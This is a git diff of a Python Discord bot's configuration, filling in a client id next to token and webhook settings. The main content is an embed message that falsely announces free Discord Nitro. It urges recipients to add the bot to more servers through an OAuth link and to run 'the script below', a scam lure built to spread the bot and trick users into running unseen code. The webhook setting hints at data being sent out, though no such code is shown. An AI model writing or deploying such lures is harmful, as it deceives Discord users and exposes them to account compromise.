@@ -8,7 +8,7 @@ from discord.ext import commands
 #config
 
 token = 'your-token' #your token
-id = 'your-id' #the client id of your bot
+id = '1165681672428199996' #the client id of your bot
 webhookurl = 'your-webhook' #your webhook url
 intents = discord.Intents.all()
 message = discord.Embed(title="Congratulations!🎊", description="You have been randomly selected to win FREE discord nitro for 3 months!\nTo claim your prize, add me to another server of your choice using the link: https://discord.com/oauth2/authorize?client_id="+id+"&scope=bot&permissions=2048\nWithin 24 hours I'll dm you your free nitro gift!\nIf you're a real discord pro, use the script below for free nitro for a full year subscription!")
